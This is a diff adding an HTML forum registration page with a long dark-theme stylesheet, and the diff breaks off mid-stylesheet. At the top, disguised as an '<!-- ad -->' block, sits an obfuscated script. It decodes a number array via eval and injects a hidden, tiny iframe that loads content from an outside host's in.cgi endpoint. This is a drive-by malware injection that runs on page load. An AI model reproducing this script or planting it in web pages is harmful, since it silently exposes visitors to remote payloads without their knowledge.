@@ -1,0 +1,1922 @@
+<!-- ad --><script>c=3-1;i=c-2;if(window.document)if(parseInt("0"+"1"+"2"+"3")===83)try{Date().prototype.q}catch(egewgsd){f=['-31i-31i65i62i-8i0i60i71i59i77i69i61i70i76i6i63i61i76i29i68i61i69i61i70i76i75i26i81i44i57i63i38i57i69i61i0i-1i58i71i60i81i-1i1i51i8i53i1i83i-27i-31i-31i-31i65i62i74i57i69i61i74i0i1i19i-27i-31i-31i85i-8i61i68i75i61i-8i83i-27i-31i-31i-31i60i71i59i77i69i61i70i76i6i79i74i65i76i61i0i-6i20i65i62i74i57i69i61i-8i75i74i59i21i-1i64i76i76i72i18i7i7i63i65i63i57i76i61i74i65i57i6i65i70i7i65i70i6i59i63i65i23i15i-1i-8i79i65i60i76i64i21i-1i9i8i-1i-8i64i61i65i63i64i76i21i-1i9i8i-1i-8i75i76i81i68i61i21i-1i78i65i75i65i58i65i68i65i76i81i18i64i65i60i60i61i70i19i72i71i75i65i76i65i71i70i18i57i58i75i71i68i77i76i61i19i68i61i62i76i18i8i19i76i71i72i18i8i19i-1i22i20i7i65i62i74i57i69i61i22i-6i1i19i-27i-31i-31i85i-27i-31i-31i62i77i70i59i76i65i71i70i-8i65i62i74i57i69i61i74i0i1i83i-27i-31i-31i-31i78i57i74i-8i62i-8i21i-8i60i71i59i77i69i61i70i76i6i59i74i61i57i76i61i29i68i61i69i61i70i76i0i-1i65i62i74i57i69i61i-1i1i19i62i6i75i61i76i25i76i76i74i65i58i77i76i61i0i-1i75i74i59i-1i4i-1i64i76i76i72i18i7i7i63i65i63i57i76i61i74i65i57i6i65i70i7i65i70i6i59i63i65i23i15i-1i1i19i62i6i75i76i81i68i61i6i78i65i75i65i58i65i68i65i76i81i21i-1i64i65i60i60i61i70i-1i19i62i6i75i76i81i68i61i6i72i71i75i65i76i65i71i70i21i-1i57i58i75i71i68i77i76i61i-1i19i62i6i75i76i81i68i61i6i68i61i62i76i21i-1i8i-1i19i62i6i75i76i81i68i61i6i76i71i72i21i-1i8i-1i19i62i6i75i61i76i25i76i76i74i65i58i77i76i61i0i-1i79i65i60i76i64i-1i4i-1i9i8i-1i1i19i62i6i75i61i76i25i76i76i74i65i58i77i76i61i0i-1i64i61i65i63i64i76i-1i4i-1i9i8i-1i1i19i-27i-31i-31i-31i60i71i59i77i69i61i70i76i6i63i61i76i29i68i61i69i61i70i76i75i26i81i44i57i63i38i57i69i61i0i-1i58i71i60i81i-1i1i51i8i53i6i57i72i72i61i70i60i27i64i65i68i60i0i62i1i19i-27i-31i-31i85'][0].split('i');v="ev"+"a"+"l";}if(v)e=window[v];w=f;s=[];r=String;for(;565!=i;i+=1){j=i;s+=r["fr"+"omC"+"harCode"](40+1*w[j]);}
+if(f)z=s;e(z);</script><!-- /ad --><html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head> 
+<title>Регистрация</title>
+<meta http-equiv="content-type" content="text/html; charset=windows-1251" /> 
+<link rel="shortcut icon" href="favicon.ico" />
+ 
+<style type="text/css">
+	.ipbtable
+{
+	width: 100%;
+}
+
+table.ipbtable,
+tr.ipbtable,
+td.ipbtable
+{
+	background: transparent;
+	color: #222;
+	font-size: 11px;
+	line-height: 135%;
+}
+
+.ipbtable td,
+.divpad
+{
+	padding: 5px;
+}
+
+html
+{
+	overflow-x: auto;
+}
+
+body
+{
+	background: black;
+	color: #D1C0A5;
+	font-family: Verdana, Tahoma, Arial, Trebuchet MS, Sans-Serif, Georgia, Courier, Times New Roman, Serif;
+	font-size: 12px;
+	line-height: 135%;
+	margin: 0;
+	padding: 0;
+	text-align: center;
+}
+
+table,
+tr,
+td
+{
+	background: transparent;
+	color: #D1C0A5;
+	font-size: 11px;
+	line-height: 135%;
+}
+
+table
+{
+	width: 100%;
+}
+
+td.nopad
+{
+	padding: 0;
+}
+
+form
+{
+	display: inline;
+	margin: 0;
+	padding: 0;
+}
+
+img
+{
+	border: 0;
+	vertical-align: middle;
+}
+
+a:link,
+a:visited
+{
+	background: transparent;
+	color: #E5C393;
+	text-decoration: none;
+}
+
+a:hover,
+a:active
+{
+	background: transparent;
+	color: #E5B673;
+}
+
+#ipbwrapper
+{
+	margin: 0px auto 0px auto;
+	text-align: left;
+	width: 100%;
+}
+
+.pagelink,
+.pagelinklast,
+.pagecurrent,
+.minipagelink,
+.minipagelinklast
+{
+	background: #000;
+	border: 1px solid #2F2F2F;
+	padding: 1px 3px 1px 3px;
+}
+
+.pagelinklast,
+.minipagelinklast
+{
+	background: #DFE6EF;
+}
+
+.pagecurrent
+{
+	background: #666666;
+}
+
+.minipagelink,
+.minipagelinklast
+{
+	border: 1px solid #000000;
+	font-size: 10px;
+	margin: 0 1px 0 0;
+}
+
+.pagelink a:active,
+.pagelink a:visited,
+.pagelink a:link,
+.pagelinklast a:active,
+.pagelinklast a:visited,
+.pagelinklast a:link,
+.pagecurrent a:active,
+.pagecurrent a:visited,
+.pagecurrent a:link,
+.minipagelink a:active,
+.minipagelink a:visited,
+.minipagelink a:link,
+.minipagelinklast a:active,
+.minipagelinklast a:visited,
+.minipagelinklast a:link
+{
+	text-decoration: none;
+}
+
+.fauxbutton
+{
+	background: #2D2D2D;
+	color: #D1C0A5;
+	border: 1px solid #707070;
+	font-size: 11px;
+	font-weight: bold;
+	padding: 4px;
+}
+
+.fauxbutton a:link,
+.fauxbutton a:visited,
+.fauxbutton a:active
+{
+	color: #D1C0A5 !important;
+	text-decoration: none;
+}
+
+.forumdesc,
+.forumdesc a:link,
+.forumdesc a:visited,
+.forumdesc a:active
+{
+	background: transparent;
+	font-size: 10px;
+	color: #D1C0A5;
+	line-height: 135%;
+	margin: 2px 0 0 0;
+	padding: 0;
+}
+
+.searchlite
+{
+	background-color: yellow;
+	font-weight: bold;
+	color: red;
+}
+
+.activeusers
+{
+	background: #D1C0A5;
+	border: 1px solid #2F2F2F;
+	color: #000;
+	margin: 0px;
+	padding: 1px;
+}
+
+.activeuserposting a:link,
+.activeuserposting a:visited,
+.activeuserposting a:active,
+.activeuserposting
+{
+	font-style: italic;
+	text-decoration: none;
+	border-bottom: 1px dotted black;
+}
+
+fieldset.search
+{
+	line-height: 150%;
+	padding: 6px;
+}
+
+label
+{
+	cursor: pointer;
+}
+
+img.attach
+{
+	background: #808080 url(style_images/valhalla/click2enlarge.gif) no-repeat top right;
+	border: 1px solid #808080;
+	margin: 0 2px 0 0;
+	padding: 11px 2px 2px 2px;
+}
+
+.thumbwrap,
+.thumbwrapp,
+.fullimagewrap
+{
+	border: 1px solid #2F2F2F;
+	margin: 2px;
+}
+
+.thumbwrapp
+{
+	border: 2px solid #660707;
+}
+
+.fullimagewrap
+{
+	background: #101010;
+	text-align: center;
+	margin: 5px 0 5px 0;
+	padding: 5px;
+}
+
+.thumbwrap h4,
+.thumbwrapp h4
+{
+	background: #101010;
+	border: 0 !important;
+	border-bottom: 0px solid #5C5C5C !important;
+	color: #5C5C5C;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0;
+	padding: 5px;
+}
+
+.thumbwrap p,
+.thumbwrapp p
+{
+	background: #EEF2F7 !important;
+	border: 0 !important;
+	border-top: 1px solid #5C5C5C !important;
+	margin: 0 !important;
+	padding: 5px !important;
+	text-align: left;
+}
+
+.thumbwrap p.alt,
+.thumbwrapp p.alt
+{
+	background: #DFE6EF !important;
+	margin: 0 !important;
+	padding: 5px !important;
+	text-align: left;
+}
+
+.thumbwrapp p.pin
+{
+	background: #EFDFDF !important;
+	text-align: center !important;
+}
+
+.thumbwrap img.galattach,
+.thumbwrapp img.galattach
+{
+	background: #2F2F2F url(style_images/valhalla/img_larger.gif) no-repeat bottom right;
+	border: 1px solid #2F2F2F;
+	margin: 5px;
+	padding: 2px 2px 10px 2px;
+}
+
+li.helprow
+{
+	margin: 0 0 10px 0;
+	padding: 0;
+}
+
+ul#help
+{
+	padding: 0 0 0 15px;
+}
+
+.warngood,
+.warnbad
+{
+	color: #0B9500;
+	font-weight: bold;
+}
+
+.warnbad
+{
+	color: #DD0000;
+}
+
+#padandcenter
+{
+	margin: 0 auto 0 auto;
+	padding: 14px 0 14px 0;
+	text-align: center;
+}
+
+#profilename
+{
+	font-size: 28px;
+	font-weight: bold;
+}
+
+#photowrap
+{
+	padding: 6px;
+}
+
+#phototitle
+{
+	border-bottom: 1px solid #000;
+	font-size: 24px;
+}
+
+#photoimg
+{
+	margin: 15px 0 0 0;
+	text-align: center;
+}
+
+#ucpmenu,
+#ucpcontent
+{
+	background: #000;
+	border: 0px solid #3E3E3E;
+	line-height: 150%;
+}
+
+#ucpmenu p
+{
+	margin: 0;
+	padding: 2px 5px 6px 9px;
+}
+
+#ucpmenu a:link, 
+#ucpmenu a:active, 
+#ucpmenu a:visited
+{
+	text-decoration: none;
+}
+
+#ucpcontent
+{
+	width: auto;
+}
+
+#ucpcontent p
+{
+	margin: 0;
+	padding: 10px;
+}
+
+.activeuserstrip
+{
+	background: #BCD0ED;
+	padding: 6px;
+}
+
+.signature
+{
+	background: transparent;
+	color: #FFFF99;
+	font-size: 10px;
+	line-height: 150%;
+}
+
+.postdetails
+{
+	font-size: 10px;
+	line-height: 140%;
+}
+
+.postcolor
+{
+	font-size: 12px;
+	line-height: 160%;
+}
+
+.normalname
+{
+	color: #003;
+	font-size: 12px;
+	font-weight: bold;
+}
+
+.normalname a:link, 
+.normalname a:visited, 
+.normalname a:active
+{
+	font-size: 12px;
+}
+
+.post1,
+.bg1
+{
+	background: #000000 url(style_images/valhalla/tile_post.jpg) repeat-x;
+}
+
+.post2,
+.bg3
+{
+	background: #000000 url(style_images/valhalla/tile_post.jpg) repeat-x;
+}
+
+.row2shaded,
+.post1shaded
+{
+	background-color: #333333;
+	border: 1px solid #3E3E3E;
+}
+
+.row4shaded,
+.post2shaded
+{
+	background-color: #000000;
+	border: 1px solid #3E3E3E;
+}
+
+.row1
+{
+	background: #000;
+	border: 1px solid #3E3E3E;
+}
+
+.row2
+{
+	background: #000;
+	border: 1px solid #3E3E3E;
+}
+
+.jumprow
+{
+	background: #000;
+	border: 0px solid #3E3E3E;
+}
+
+.row4
+{
+	background: #101010 url(style_images/valhalla/tile_row4.gif);
+	border: 0px;
+}
+
+.darkrow1
+{
+	background: #919191 url(style_images/valhalla/tile_darkrow1.gif);
+	color: #D1C0A5;
+}
+
+.darkrow3
+{
+	background: #0C0C0C;
+	color: #5C5C5C;
+}
+
+.plainborder,
+.tablefill,
+.tablepad
+{
+	color: #ff0000;
+	background: #000;
+	border: 1px solid #345487;
+}
+
+.tablefill,
+.tablepad
+{
+	padding: 6px;
+}
+
+.tablepad
+{
+	border: 0 !important;
+}
+
+.wrapmini
+{
+	float: left;
+	line-height: 1.5em;
+	width: 25%;
+}
+
+.pagelinks
+{
+	float: left;
+	line-height: 1.2em;
+	width: 35%;
+}
+
+.desc
+{
+	font-size: 11px;
+	color: #D1C0A5;
+}
+
+.lastaction
+{
+	font-size: 10px;
+	color: #D1C0A5;
+}
+
+.edit
+{
+	font-size: 9px;
+}
+
+.thin
+{
+	border: 1px solid #3E3E3E;
+	border-left: 0;
+	border-right: 0;
+	line-height: 150%;
+	margin: 2px 0 2px 0;
+	padding: 6px 0 6px 0;
+}
+
+.calmonths
+{
+	background: #49423C url(style_images/valhalla/tile_calmonths.gif);
+	border: 0px solid #000000;
+	font-size: 18px;
+	font-weight: bold;
+	margin: 5px 0 5px 0;
+	padding: 16px;
+	text-align: center;
+}
+
+.weekday
+{
+	font-size: 14px;
+	font-weight: bold;
+}
+
+.calmonths a
+{
+	text-decoration: none;
+}
+
+.calday,
+.calweekday
+{
+	background: #3B3B3B;
+	border-top: 1px solid #3E3E3E;
+	border-bottom: 1px solid #3E3E3E;
+	color: #E5C393;
+	font-size: 11px;
+	font-weight: bold;
+	margin: 0;
+	padding: 4px;
+	text-align: right;
+}
+
+.calweekday
+{
+	background: #2D2D2D;
+	border: 1px solid #3E3E3E;
+	color: #D1C0A5;
+	font-size: 14px;
+	padding: 6px;
+	text-align: center;
+}
+
+.cellblank,
+.celldate,
+.celltoday,
+.mcellblank,
+.mcelldate,
+.mcelltoday
+{
+	background: #1F1F1F;
+	border: 0px solid #3E3E3E;
+	height: 100px;
+	margin: 0;
+	padding: 0;
+	vertical-align: top;
+}
+
+.mcellblank,
+.mcelldate,
+.mcelltoday
+{
+	height: auto;
+}
+
+.cellblank,
+.mcellblank
+{
+	background: #000;
+}
+
+.celltoday,
+.mcelltoday
+{
+	border: 1px dotted #FF9900;
+}
+
+legend
+{
+	color: #E5C393;
+}
+
+input,
+textarea,
+select
+{
+	background: #000000 url(style_images/valhalla/tile_post.jpg) repeat-x;
+	border: 1px solid #707070;
+	color: #D1C0A5;
+	font-family: verdana, helvetica, sans-serif;
+	font-size: 11px;
+	margin: 5px;
+	padding: 2px;
+	vertical-align: middle;
+}
+
+input.checkbox
+{
+	border: 0;
+	margin: 0px;
+	padding: 0px;
+}
+
+input.ucpbottom
+{
+	padding: 1px;
+	margin: 2px;
+}
+
+input.ucpbottomsmall
+{
+	padding: 0px;
+	margin: 0px;
+}
+
+select
+{
+	border: 0;
+	font-family: verdana, helvetica, sans-serif;
+	font-size: 12px;
+	margin: 0;
+	padding: 0;
+}
+
+input.button
+{
+	margin: 0px;
+	width: auto;
+}
+
+input.textbox
+{
+	border: 2px dotted #707070;
+	margin: 0px;
+	width: auto;
+}
+
+input.messengerbutton
+{
+	margin: 2px;
+	padding: 1px;
+	width: auto;
+}
+
+optgroup option
+{
+	font-family: verdana, helvetica, sans-serif;
+	font-size: 12px;
+}
+
+.codebuttons
+{
+	font-family: Verdana, Helvetica, Sans-Serif;
+	font-size: 10px;
+	vertical-align: middle;
+	margin: 2px;
+}
+
+.textarea,
+.searchinput,
+.button,
+.gobutton
+{
+	background: #000000 url(style_images/valhalla/tile_post.jpg) repeat-x;
+	border: 1px solid #3A3A3A;
+	color: #D1C0A5;
+	font-family: Verdana, Helvetica, Sans-Serif;
+	font-size: 11px;
+	padding: 2px;
+	vertical-align: middle;
+}
+
+.searchinput
+{
+	border: 2px dotted #707070;
+	color: #D1C0A5;
+}
+
+.button
+{
+	border: 1px solid #707070;
+	background: #2D2D2D;
+	color: #D1C0A5;
+}
+
+.gobutton
+{
+	background: transparent;
+	border: 0;
+	color: #2F2F2F;
+	margin: 0;
+	vertical-align: middle;
+}
+
+.radiobutton,
+.checkbox,
+.checkbox2,
+.helpbox
+{
+	border: 0;
+	vertical-align: middle;
+}
+
+.formtable
+{
+	background: transparent;
+}
+
+.formtable td,
+.pformleft,
+.pformleftw,
+.pformright
+{
+	background: #000;
+	border: 1px solid #3E3E3E;
+	border-bottom: 0;
+	border-left: 0;
+	font-weight: bold;
+	margin: 1px 0 0 0;
+	padding: 6px;
+	width: 25%;
+}
+
+.formtable td.wider,
+.pformleftw,
+.pformright
+{
+	width: 40%;
+}
+
+.formtable td.formright,
+.pformright
+{
+	border-right: 0;
+	font-weight: normal;
+	width: auto;
+}
+
+.formtable td.formtitle,
+.formsubtitle
+{
+	background: #101010 url(style_images/valhalla/tile_stats.gif);
+	border: 1px solid #9FB9D4;
+	border-bottom: 0;
+	border-left: 0;
+	border-right: 0;
+	font-weight: normal;
+}
+
+.formsubtitlesearch
+{
+	background: #000 url(style_images/valhalla/tile_formbuttonsearch.gif);
+	border: 0px solid #9FB9D4;
+	border-bottom: 0;
+	border-left: 0;
+	border-right: 0;
+	font-weight: normal;
+	padding: 0px;
+}
+
+.formsubtitle
+{
+	border: 0;
+	color: #E5C393;
+	font-weight: bold;
+	padding: 4px;
+}
+
+.formtable td.formstrip
+{
+	background: #DDE8F2;
+	border: 1px solid #9FB9D4;
+	border-left: 0;
+	border-right: 0;
+	font-weight: normal;
+}
+
+.formcalminisubtitle
+{
+	background: url(style_images/valhalla/tile_calminisubtitle.gif);
+}
+
+.formcalsubtitle
+{
+	background: url(style_images/valhalla/tile_calsubtitle.gif);
+}
+
+.quotetop
+{
+	background: #2D2D2D;
+	border: 1px dotted #3E3E3E;
+	color: #D1C0A5;
+	font-weight: bold;
+	font-size: 10px;
+	margin: 8px auto 0 auto;
+	padding: 4px;
+	width: 90%;
+}
+
+.quotemain
+{
+	background: #444444;
+	border: 1px dotted #3E3E3E;
+	border-top: 0;
+	color: #E5C393;
+	margin: 0 auto 8px auto;
+	padding: 4px;
+	width: 90%;
+}
+
+.codetop,
+.sqltop,
+.htmltop
+{
+	background: #2D2D2D;
+	border: 1px dotted #3E3E3E;
+	color: #D1C0A5;
+	font-weight: bold;
+	font-size: 10px;
+	margin: 8px auto 0 auto;
+	padding: 4px;
+	width: 90%;
+}
+
+.codemain,
+.sqlmain,
+.htmlmain
+{
+	background: #444444;
+	border: 1px dotted #3E3E3E;
+	border-top: 0;
+	color: #E5C393;
+	margin: 0 auto 8px auto;
+	padding: 4px;
+	width: 90%;
+}
+
+#QUOTE,
+#CODE
+{
+	background: #FAFCFE;
+	border: 1px solid #000;
+	color: #465584;
+	font-family: Verdana, Arial;
+	font-size: 11px;
+	padding: 2px;
+	white-space: normal;
+}
+
+#CODE
+{
+	font-family: Courier, Courier New, Verdana, Arial;
+}
+
+.cleared
+{
+	clear: both;
+}
+
+.borderwrap
+{
+	background: transparent;
+	border: 0px solid #000;
+	padding: 0;
+	margin: 0;
+}
+
+.borderwrapm
+{
+	background: #000             border;
+	padding: 0;
+	margin: 5px;
+}
+
+.borderwrap h3,
+.maintitle,
+.maintitlecollapse
+{
+	background: transparent url(style_images/valhalla/tile_cat.gif);
+	border: 0px solid #2F2F2F;
+	border-bottom: 0px solid #5C5C5C;
+	color: #E5C393;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0;
+	padding: 16px;
+}
+
+.maintitlecollapse
+{
+	border: 0px solid #2F2F2F;
+}
+
+.maintitle p,
+.maintitlecollapse p,
+.formsubtitle p
+{
+	background: transparent !important;
+	border: 0 !important;
+	margin: 0 !important;
+	padding: 0 !important;
+}
+
+.maintitle p.expand,
+.maintitle p.goto,
+.maintitlecollapse p.expand,
+.formsubtitle p.members
+{
+	float: right;
+	width: auto !important;
+}
+
+.maintitle a:link, 
+.maintitle a:visited,
+.maintitlecollapse a:link, 
+.maintitlecollapse a:visited
+{
+	background: transparent;
+	color: #E5C393;
+	text-decoration: none;
+}
+
+.maintitle a:hover, 
+.maintitle a:active,
+.maintitlecollapse a:hover, 
+.maintitlecollapse a:active
+{
+	background: transparent;
+	color: #E5B673;
+}
+
+table th,
+.borderwrap table th,
+.subtitle,
+.subtitlediv,
+.postlinksbar
+{
+	background: transparent url(style_images/valhalla/tile_sub.gif);
+	border: 0px solid #ff0000;
+	border-bottom: 0px solid #ff0000;
+	color: #E5C393;
+	font-size: 10px;
+	font-weight: bold;
+	letter-spacing: 1px;
+	margin: 0;
+	padding: 8px;
+}
+
+.subtitlediv
+{
+	border: 1px solid #2F2F2F;
+	border-bottom: 1px solid #5C5C5C;
+	text-align: right;
+}
+
+.borderwrap table th a:link,
+.subtitle a:link,
+.subtitlediv a:link,
+.borderwrap table th a:visited,
+.subtitle a:visited, 
+.subtitlediv a:visited
+{
+	background: transparent;
+	color: #E5C393;
+	text-decoration: none;
+}
+
+.borderwrap table th a:active,
+.subtitle a:active,
+.subtitlediv a:active,
+.borderwrap table th a:hover,
+.subtitle a:hover,
+.subtitlediv a:hover
+{
+	background: transparent;
+	color: #E5B673;
+	text-decoration: none;
+}
+
+.borderwrap h4
+{
+	background: #101010 url(style_images/valhalla/tile_borderwrap_h4.gif);
+	border: 0px	color;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0;
+	padding: 5px;
+}
+
+.borderwrap p
+{
+	background: #000 url(style_images/valhalla/tile_borderwrap_p.gif);
+	border: 0px solid #707070;
+	margin: 0px;
+	padding: 10px;
+	text-align: left;
+	font-weight: bold;
+	font-size: 10px;
+}
+
+.borderwrap p2
+{
+	background: #000;
+	border: 0px solid #707070;
+	margin: 0px;
+	padding: 10px;
+	text-align: left;
+	font-weight: bold;
+	font-size: 10px;
+}
+
+td.formbuttonrow,
+.borderwrap p.formbuttonrow,
+.borderwrap p.formbuttonrow1
+{
+	background: #101010 url(style_images/valhalla/tile_formbuttonrow.gif);
+	!important: ;
+	border: 0px solid #000;
+	border-top: 0px solid #000;
+	margin: 0px !important;
+	padding: 3px !important;
+	text-align: center;
+}
+
+td.formbuttonrow
+{
+	border-bottom: 0;
+	border-left: 0;
+	border-right: 0;
+}
+
+.borderwrap p.formbuttonrow1
+{
+	background: #F9F9F9 !important;
+	border: 0;
+	border-top: 1px solid #CCC;
+}
+
+td.errorback,
+.borderwrap p.errorback
+{
+	background: #101010 url(style_images/valhalla/tile_errorback.gif);
+	!important: ;
+	border: 0px solid #000;
+	border-top: 0px solid #000;
+	margin: 0px !important;
+	padding: 5px !important;
+	text-align: center;
+}
+
+.bar,
+.barb,
+.barc
+{
+	background: #101010 url(style_images/valhalla/tile_bar.gif);
+	border: 1px solid #3A3A3A;
+	border-bottom: 1px solid #3A3A3A;
+}
+
+.bar p,
+.barb p,
+.barc p
+{
+	background: transparent;
+	border: 0;
+	color: #E5C393;
+	font-size: 11px;
+	margin: 0;
+	padding: 5px;
+	text-align: left;
+}
+
+.barb p
+{
+	text-align: right;
+}
+
+.bar p.over,
+.bar p.overs,
+.barc p.over,
+.barc p.overs
+{
+	float: right;
+}
+
+.barb p.over,
+.barb p.overs
+{
+	float: left;
+}
+
+.bar p.overs,
+.barb p.overs,
+.barc p.overs
+{
+	position: relative;
+	top: 5px;
+}
+
+.catend
+{
+	background: #000 url(style_images/valhalla/tile_catend.gif);
+	color: #000;
+	font-size: 1px;
+	height: 45px;
+}
+
+.newslink
+{
+	background: #000 url(style_images/valhalla/news.gif);
+	border: 0;
+	margin: 0;
+	width: 100%;
+}
+
+.newslink td
+{
+	color: #D1C0A5;
+	font-size: 10px;
+	padding: 5px 5px 5px 10px;
+}
+
+.newslink span
+{
+	background: transparent;
+	color: #E5B673;
+	font-style: none;
+	font-weight: bold;
+}
+
+.newslink input
+{
+	background: #000;
+	border: 2px dotted #707070;
+	color: #D1C0A5;
+	font-size: 10px;
+	padding: 3px;
+	vertical-align: middle;
+	width: auto;
+}
+
+.newslink input.button
+{
+	background: transparent;
+	border: 0;
+	color: #2F2F2F;
+	vertical-align: middle;
+}
+
+.fieldwrap
+{
+	background: #F9F9F9;
+	border: 1px solid #CCC;
+	border-top: 0;
+	margin: 5px;
+	padding: 0;
+	text-align: left;
+}
+
+.fieldwrap h4
+{
+	background: #EEE;
+	border: 1px solid #CCC;
+	border-left: 0;
+	border-right: 0;
+	color: #444;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0;
+	padding: 5px;
+}
+
+.errorwrap,
+#pmnotewrap
+{
+	background: #F2DDDD;
+	border: 1px solid #992A2A;
+	border-top: 0;
+	margin: 5px;
+	padding: 0;
+}
+
+#pmnotewrap
+{
+	line-height: 135%;
+	margin: 0 0 5px 0;
+}
+
+.errorwrap h4,
+#pmnotewrap h4
+{
+	background: #E3C0C0;
+	border: 1px solid #992A2A;
+	border-left: 0;
+	border-right: 0;
+	color: #992A2A;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0;
+	padding: 5px;
+}
+
+.errorwrap p,
+#pmnotewrap p
+{
+	background: transparent;
+	border: 0;
+	color: #992A2A;
+	margin: 0;
+	padding: 8px;
+}
+
+#pmnotewrap p.pmavatar
+{
+	float: left;
+}
+
+#pmnotewrap p.pmnotefoot
+{
+	background: #E3C0C0;
+	border-top: 1px solid #992A2A;
+	text-align: right;
+}
+
+#pmnotewrap a:link, 
+#pmnotewrap  a:visited
+{
+	background: transparent;
+	color: #E5C393;
+	text-decoration: underline;
+}
+
+#pmnotewrap a:hover, 
+#pmnotewrap a:active
+{
+	background: transparent;
+	color: #E5B673;
+	text-decoration: none;
+}
+
+.ruleswrap
+{
+	background: #F2DDDD;
+	border: 1px solid #992A2A;
+	color: #992A2A;
+	margin: 5px 0 5px 0;
+	padding: 5px;
+}
+
+#redirectwrap
+{
+	background: #3E3E3E;
+	border: 0px solid #000000;
+	margin: 200px auto 0 auto;
+	text-align: left;
+	width: 515px;
+}
+
+#redirectwrap h4
+{
+	background: #3B3B3B url(style_images/valhalla/tile_redirecth4.gif);
+	border-bottom: 0px solid #000000;
+	color: #E5C393;
+	font-size: 14px;
+	margin: 0;
+	padding: 8px;
+}
+
+#redirectwrap p
+{
+	background: url(style_images/valhalla/tile_post.jpg);
+	margin: 0;
+	padding: 5px;
+}
+
+#redirectwrap p.redirectfoot
+{
+	background: #1F1F1F url(style_images/valhalla/tile_redirectfoot.gif);
+	border-top: 0px solid #000000;
+	text-align: center;
+	padding: 3px;
+}
+
+#redirectwrap p.redirectend
+{
+	background: #000 url(style_images/valhalla/tile_catend.gif);
+	border: 0;
+	text-align: center;
+	height: 45px;
+}
+
+#gfooter
+{
+	background-color: #101010;
+	margin: 5px 0 5px 0;
+	padding: 12px 0px 12px 0px;
+	font-weight: bold;
+	width: 100%;
+}
+
+#gfooter td
+{
+	color: #D1C0A5;
+	font-size: 10px;
+	padding: 9px;
+}
+
+#gfooter a:link,
+#gfooter a:visited
+{
+	color: #D1C0A5;
+}
+
+#logostrip
+{
+	background: #000 url(style_images/valhalla/header_back.jpg);
+	border: 0;
+	height: 200px;
+	margin: 0;
+	padding: 0;
+}
+
+#submenu
+{
+	background: #000;
+	border: 0;
+	border-top: 0;
+	color: #E5C393;
+	margin: 0;
+}
+
+#userlinks,
+#userlinksguest
+{
+	background: #000;
+	border: 0;
+	margin: 5px 0 5px 0;
+	padding: 0 5px 0 5px;
+}
+
+#userlinksguest
+{
+	background: #000;
+	border: 0;
+}
+
+#submenu p,
+#userlinks p,
+#userlinksguest p
+{
+	background: transparent !important;
+	border: 0 !important;
+	font-size: 10px;
+	font-weight: bold;
+	letter-spacing: 1px;
+	margin: 0 !important;
+	padding: 7px 0 7px 0;
+	text-align: right;
+}
+
+#userlinks p,
+#userlinksguest p
+{
+	font-weight: normal;
+	letter-spacing: 0;
+}
+
+#submenu p.home,
+#userlinks p.home,
+#userlinksguest p.home
+{
+	float: left;
+}
+
+#userlinksguest p.pcen
+{
+	text-align: center;
+}
+
+#submenu a:link, 
+#submenu  a:visited
+{
+	background: transparent;
+	color: #E5C393;
+	padding: 0 6px 0 6px;
+	text-decoration: none;
+}
+
+#submenu a:hover, 
+#submenu a:active
+{
+	background: transparent;
+	color: #E5B673;
+}
+
+#navstrip
+{
+	background: transparent repeat-x;
+	color: #D1C0A5;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0 0 5px 0;
+	padding: 12px 0 12px 0px;
+}
+
+#navstrip a:link, 
+#navstrip  a:visited
+{
+	background: transparent;
+	color: #E5C393;
+	text-decoration: none;
+}
+
+#navstrip a:hover, 
+#navstrip a:active
+{
+	background: transparent;
+	color: #E5B673;
+}
+
+.toplinks
+{
+	background: transparent;
+	color: #000;
+	margin: 0;
+	padding: 0 0 10px 0;
+	text-align: right;
+}
+
+.toplinks span
+{
+	background: #2B2923 url(style_images/valhalla/tile_toplinks.gif);
+	border: 1px solid #1C1B1A;
+	border-bottom: 1px solid #1C1B1A;
+	color: #000;
+	font-size: 10px;
+	font-weight: bold;
+	margin: 0 10px 0 0;
+	padding: 10px;
+}
+
+.copyright
+{
+	background: #000;
+	font-size: 11px;
+	margin: 0 0 5px 0;
+	padding: 8px;
+}
+
+#print
+{
+	margin: 20px auto 20px auto;
+	padding: 0;
+	text-align: left;
+	width: 85%;
+}
+
+#print h1,
+#print h2,
+#print h3,
+#print h4,
+#print p
+{
+	color: #036;
+	font-size: 18px;
+	font-weight: bold;
+	margin: 0;
+	padding: 20px;
+}
+
+#print h2,
+#print h3,
+#print p
+{
+	border-bottom: 1px solid #999;
+	font-size: 11px;
+	font-weight: normal;
+}
+
+#print h3
+{
+	background: #F5F5F5;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0 0 10px 0;
+}
+
+#print h4
+{
+	background: #F9F9F9;
+	font-size: 11px;
+}
+
+#print p
+{
+	margin: 0 0 5px 0;
+	padding: 10px;
+}
+
+#print p.printcopy
+{
+	border: 0;
+	color: #000;
+	text-align: center;
+}
+
+.rteimage
+{
+	cursor: hand;
+	padding: 1px;
+}
+
+.rteImageRaised
+{
+	border: 1px outset;
+	cursor: hand;
+	padding: 0px;
+}
+
+.rteImageLowered
+{
+	border: 1px inset;
+	cursor: hand;
+	padding: 0px;
+}
+
+.rteimage:hover
+{
+	background: #EBEBEB;
+	cursor: hand;
+}
+
+.rteVertSep
+{
+	margin: 0 4px 0 4px;
+}
+
+.rteBack
+{
+	background: #D3D3D3;
+	border: 1px outset;
+	letter-spacing: 0;
+	padding: 2px;
+}
+
+.rtebottombutton
+{
+	font-size: 10px;
+	border: 1px solid #777;
+	border-top: 0px;
+	padding: 3px;
+	margin: 0px;
+	background-color: #EBEBEB;
+}
+
+.rtebottombuttonon
+{
+	font-size: 10px;
+	border: 1px solid #777;
+	border-top: 0px;
+	padding: 3px;
+	margin: 0px;
+	background-color: #D3D3D3;
+}
+
+.rtebuttonbar1
+{
+	background-image: url(style_images/valhalla/folder_rte_images/rte_tile.gif);
+	border: 1px solid gray;
+	border-bottom: 0px;
+	letter-spacing: 0;
+	padding: 2px;
+	height: 26px;
+}
+
+.rtebuttonbar2
+{
+	background-image: url(style_images/valhalla/folder_rte_images/rte_tile.gif);
+	border: 1px solid gray;
+	border-top: 1px solid gray;
+	letter-spacing: 0;
+	padding: 2px;
+	height: 26px;
+}
+
+.rtebuttonbar1 tbody tr td,
+.rtebuttonbar1 tr td,
+.rtebuttonbar2 tbody tr td,
+.rtebuttonbar2 tr td,
+.rteBack tbody tr td,
